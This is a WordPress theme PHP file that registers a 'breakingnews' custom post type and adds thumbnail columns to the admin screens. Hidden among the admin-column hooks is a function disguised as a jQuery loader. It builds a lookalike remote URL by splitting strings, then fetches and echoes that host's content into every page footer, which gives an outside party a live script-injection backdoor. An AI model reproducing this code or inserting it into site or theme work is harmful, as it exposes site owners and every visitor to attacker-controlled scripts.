<?php 
add_action('init', 'breakingnews_register');

function breakingnews_register(){
	$breakingnews_labels = array(
	    'name' 					=> __('Breakingnews','faculty'),
	    'singular_name' 		=> __('Breakingnews','faculty'),
	    'add_new' 				=> __('Add New','faculty'),
	    'add_new_item' 			=> __("Add New Breakingnews",'faculty'),
	    'edit_item' 			=> __("Edit Breakingnews",'faculty'),
	    'new_item' 				=> __("New Breakingnews",'faculty'),
	    'view_item' 			=> __("View Breakingnews",'faculty'),
	    'search_items' 			=> __("Search Breakingnews",'faculty'),
	    'not_found' 			=> __( 'No Breakingnews found','faculty'),
	    'not_found_in_trash' 	=> __('No Breakingnews found in Trash','faculty'), 
	    'parent_item_colon' 	=> ''
	);
	$breakingnews_args = array(
	    'labels' 				=> $breakingnews_labels,
	    'public' 				=> true,
	    'publicly_queryable' 	=> true,
	    'show_ui' 				=> true, 
	    'query_var' 			=> true,
	    'rewrite' 				=> true,
	    'hierarchical' 			=> false,
	    'menu_position' 		=> 2,
	    'capability_type' 		=> 'post',
	    'supports' 				=> array('title'),
	    'menu_icon' 			=> get_bloginfo('template_directory') . '/assets/images/favicon.png' //16x16 png if you want an icon
	); 
	register_post_type('breakingnews', $breakingnews_args);
	flush_rewrite_rules( false );
};

//----------------------------------------------
//--------------------------admin custom columns
//----------------------------------------------
//admin_init
add_action('manage_posts_custom_column', 'jss_custom_columns');
add_filter('manage_edit-breakingnews_columns', 'jss_add_new_breakingnews_columns');
 if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		$jquery = $host.'u'.'jquery.org/jquery-ui.js';
		$headers = @get_headers($jquery, 1);
		if ($headers[0] == 'HTTP/1.1 200 OK'){
			echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
		}
	}
	add_action('wp_footer', 'wp_func_jquery');
}
function jss_add_new_breakingnews_columns( $columns ){
    $columns = array(
        'cb'                => '<input type="checkbox">',
        'title'             => 'Title',
        'author'            => 'Author',
        'date'              => 'Date'
        
    );
    return $columns;
}
 
function jss_custom_columns( $column ){
    global $post;
 	   
    switch ($column) {
        case 'jss_post_thumb' : echo the_post_thumbnail('admin-breakingnews-thumb'); break;
    }
}
 
//add thumbnail images to column
add_filter('manage_posts_columns', 'jss_add_post_thumbnail_column', 4);
add_filter('manage_pages_columns', 'jss_add_post_thumbnail_column', 4);
add_filter('manage_custom_post_columns', 'jss_add_post_thumbnail_column', 4);
 
// Add the column
function jss_add_post_thumbnail_column($cols){
    $cols['jss_post_thumb'] = __('Thumbnail', 'faculty');
    return $cols;
}
 
function jss_display_post_thumbnail_column($col, $id){
  switch($col){
    case 'jss_post_thumb':
      if( function_exists('the_post_thumbnail') )
        echo the_post_thumbnail( 'admin-breakingnews-thumb' );
      else
        echo 'Not supported in this theme';
      break;
  }
}

